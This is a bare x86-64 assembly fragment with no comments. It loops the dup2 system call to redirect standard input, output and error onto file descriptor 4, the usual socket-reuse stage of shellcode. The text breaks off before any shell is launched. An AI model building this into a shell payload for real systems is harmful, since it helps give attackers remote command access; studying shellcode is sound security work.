BITS 64
global _start
_start:
    xor rdi,rdi
    mov dil,0x4
    xor rsi,rsi
    mov sil,0x2
dup2:
    xor rax,rax
    mov al,0x21
    syscall
    dec rsi
    jns dup2
